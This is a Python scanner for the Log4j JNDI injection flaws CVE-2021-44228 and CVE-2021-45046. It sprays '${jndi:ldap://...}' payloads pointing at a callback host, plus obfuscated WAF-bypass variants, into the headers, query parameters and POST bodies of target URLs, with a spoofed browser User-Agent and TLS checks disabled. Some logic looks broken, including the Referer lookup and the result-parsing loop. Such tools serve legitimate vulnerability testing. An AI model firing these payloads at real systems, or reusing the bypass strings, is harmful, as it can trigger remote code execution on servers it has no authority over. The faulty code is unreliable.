#!/usr/bin/env python3
# coding=utf-8
# ******************************************************************
# log4j-scan: A generic scanner for Apache log4j RCE CVE-2021-44228
# ******************************************************************

import argparse
import random
import requests
import time
import sys
from urllib import parse as urlparse
import base64
import json
import random
from uuid import uuid4
from base64 import b64encode
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Hash import SHA256
from termcolor import cprint


# Disable SSL warnings
try:
    import requests.packages.urllib3
    requests.packages.urllib3.disable_warnings()
except Exception:
    pass


cprint('[•] CVE-2021-44228 - Apache Log4j RCE Scanner', "green")


if len(sys.argv) <= 1:
    print('\n%s -h for help.' % (sys.argv[0]))
    exit(0)

fresult = open('tmp.txt','r+')
fresult.truncate()

default_headers = {
    #'User-Agent': 'log4j-scan',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36',
    'Accept': '*/*'  # not being tested to allow passing through checks on Accept header in older web-servers
}
post_data_parameters = ["username", "user", "email", "email_address", "password","c"]
timeout = 4

waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{callback_addr}}/{{random}}}",
                       "${${::-j}ndi:rmi://{{callback_addr}}/{{random}}}",
                       "${jndi:rmi://{{callback_addr}}}",
                       "${${lower:jndi}:${lower:rmi}://{{callback_addr}}/{{random}}}",
                       "${${lower:${lower:jndi}}:${lower:rmi}://{{callback_addr}}/{{random}}}",
                       "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{callback_addr}}/{{random}}}",
                       "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{callback_addr}}/{{random}}}",
                       "${jndi:dns://{{callback_addr}}}",
                       ]

cve_2021_45046 = [
                  "${jndi:ldap://127.0.0.1#{{callback_addr}}:1389/{{random}}}", # Source: https://twitter.com/marcioalm/status/1471740771581652995,
                  "${jndi:ldap://127.0.0.1#{{callback_addr}}/{{random}}}",
                  "${jndi:ldap://127.1.1.1#{{callback_addr}}/{{random}}}"
                 ]  


parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url",
                    dest="url",
                    help="Check a single URL.",
                    action='store')
parser.add_argument("-p", "--proxy",
                    dest="proxy",
                    help="send requests through proxy",
                    action='store')
parser.add_argument("-l", "--list",
                    dest="usedlist",
                    help="Check a list of URLs.",
                    action='store')
parser.add_argument("--ldap-addr",
                    dest="custom_dns_callback_addr",
                    help="Custom DNS Callback Address.",
                    action='store')
parser.add_argument("--request-type",
                    dest="request_type",
                    help="Request Type: (get, post) - [Default: get].",
                    default="get",
                    action='store')
parser.add_argument("--headers-file",
                    dest="headers_file",
                    help="Headers fuzzing list - [default: headers.txt].",
                    default="headers.txt",
                    action='store')
parser.add_argument("--run-all-tests",
                    dest="run_all_tests",
                    help="Run all available tests on each URL.",
                    action='store_true')
parser.add_argument("--exclude-user-agent-fuzzing",
                    dest="exclude_user_agent_fuzzing",
                    help="Exclude User-Agent header from fuzzing - useful to bypass weak checks on User-Agents.",
                    action='store_true')
parser.add_argument("--wait-time",
                    dest="wait_time",
                    help="Wait time after all URLs are processed (in seconds) - [Default: 5].",
                    default=5,
                    type=int,
                    action='store')
parser.add_argument("--waf-bypass",
                    dest="waf_bypass_payloads",
                    help="Extend scans with WAF bypass payloads.",
                    action='store_true')
parser.add_argument("--test-CVE-2021-45046",
                    dest="cve_2021_45046",
                    help="Test using payloads for CVE-2021-45046 (detection payloads).",
                    action='store_true')
parser.add_argument("--disable-http-redirects",
                    dest="disable_redirects",
                    help="Disable HTTP redirects. Note: HTTP redirects are useful as it allows the payloads to have higher chance of reaching vulnerable systems.",
                    action='store_true')

args = parser.parse_args()


proxies = {}
if args.proxy:
    proxies = {"http": args.proxy, "https": args.proxy}

def get_fuzzing_headers(payload):
    fuzzing_headers = {}
    fuzzing_headers.update(default_headers)
    with open(args.headers_file, "r") as f:
        for i in f.readlines():
            i = i.strip()
            if i == "" or i.startswith("#"):
                continue
            fuzzing_headers.update({i: payload})
    if args.exclude_user_agent_fuzzing:
        fuzzing_headers["User-Agent"] = default_headers["User-Agent"]

    fuzzing_headers["Referer"] = f'https://{fuzzing_headers["Referer"]}'
    return fuzzing_headers


def get_fuzzing_post_data(payload):
    fuzzing_post_data = {}
    for i in post_data_parameters:
        fuzzing_post_data.update({i: payload})
    return fuzzing_post_data


def generate_waf_bypass_payloads(callback_addr, random_string):
    payloads = []
    for i in waf_bypass_payloads:
        new_payload = i.replace("{{callback_addr}}", callback_addr)
        new_payload = new_payload.replace("{{random}}", random_string)
        payloads.append(new_payload)
    return payloads

def get_cve_2021_45046_payloads(callback_addr, random_string):
    payloads = []
    for i in cve_2021_45046:
        new_payload = i.replace("{{callback_addr}}", callback_addr)
        new_payload = new_payload.replace("{{random}}", random_string)
        payloads.append(new_payload)
    return payloads


def parse_url(url):
    """
    Parses the URL.
    """

    # Url: https://example.com/login.jsp
    url = url.replace('#', '%23')
    url = url.replace(' ', '%20')

    if ('://' not in url):
        url = str("http://") + str(url)
    scheme = urlparse.urlparse(url).scheme

    # FilePath: /login.jsp
    file_path = urlparse.urlparse(url).path
    if (file_path == ''):
        file_path = '/'

    return({"scheme": scheme,
            "site": f"{scheme}://{urlparse.urlparse(url).netloc}",
            "host":  urlparse.urlparse(url).netloc.split(":")[0],
            "file_path": file_path})


def scan_url(url, callback_addr):
    parsed_url = parse_url(url)
    random_string = ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz') for i in range(7))
    payload = '${jndi:ldap://%s/%s}' % (callback_addr, random_string)
    payloads = [payload]
    if args.waf_bypass_payloads:
        payloads.extend(generate_waf_bypass_payloads(f'{callback_addr}', random_string))
    if args.cve_2021_45046:
        cprint(f"[•] Scanning for CVE-2021-45046 (Log4j v2.15.0 Patch Bypass - RCE)", "yellow")
        payloads = get_cve_2021_45046_payloads(f'{callback_addr}', random_string)

    for payload in payloads:
        cprint(f"[•] URL: {url} | PAYLOAD: {payload}", "cyan")
        if args.request_type.upper() == "GET" or args.run_all_tests:
            try:
                requests.request(url=url,
                                 method="GET",
                                 params={"v": payload},
                                 headers=get_fuzzing_headers(payload),
                                 verify=False,
                                 timeout=timeout,
                                 allow_redirects=(not args.disable_redirects),
                                 proxies=proxies)
            except Exception as e:
                cprint(f"EXCEPTION: {e}")

        if args.request_type.upper() == "POST" or args.run_all_tests:
            try:
                # Post body
                requests.request(url=url,
                                 method="POST",
                                 params={"v": payload},
                                 headers=get_fuzzing_headers(payload),
                                 data=get_fuzzing_post_data(payload),
                                 verify=False,
                                 timeout=timeout,
                                 allow_redirects=(not args.disable_redirects),
                                 proxies=proxies)
            except Exception as e:
                cprint(f"EXCEPTION: {e}")

            try:
                # JSON body
                requests.request(url=url,
                                 method="POST",
                                 params={"v": payload},
                                 headers=get_fuzzing_headers(payload),
                                 json=get_fuzzing_post_data(payload),
                                 verify=False,
                                 timeout=timeout,
                                 allow_redirects=(not args.disable_redirects),
                                 proxies=proxies)
            except Exception as e:
                cprint(f"EXCEPTION: {e}")
    return random_string
    
    
def main():
    urls = []
    vulnerable=0
    if args.url:
        urls.append(args.url)
    if args.usedlist:
        with open(args.usedlist, "r") as f:
            for i in f.readlines():
                i = i.strip()
                if i == "" or i.startswith("#"):
                    continue
                urls.append(i)

    dns_callback_addr = ""
    cprint(f"[•] Using your ldap service address [{args.custom_dns_callback_addr}].")
    dns_callback_addr =  args.custom_dns_callback_addr

    cprint("[%] Checking for Log4j RCE CVE-2021-44228.", "magenta")
    for url in urls:
        cprint(f"[•] URL: {url}", "magenta")
        rvalue=scan_url(url, dns_callback_addr)
        for line in fresult.readlines():
            if rvalue in line:
                vulnerable=1
            if vulnerable==1:    
                cprint("[!!!] Target Affected", "yellow")
                cprint(line.strip(),"yellow")
            else:
                cprint("[•] Targets does not seem to be vulnerable.", "green")
    
    fresult.close()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nKeyboardInterrupt Detected.")
        print("Exiting...")
        exit(0)
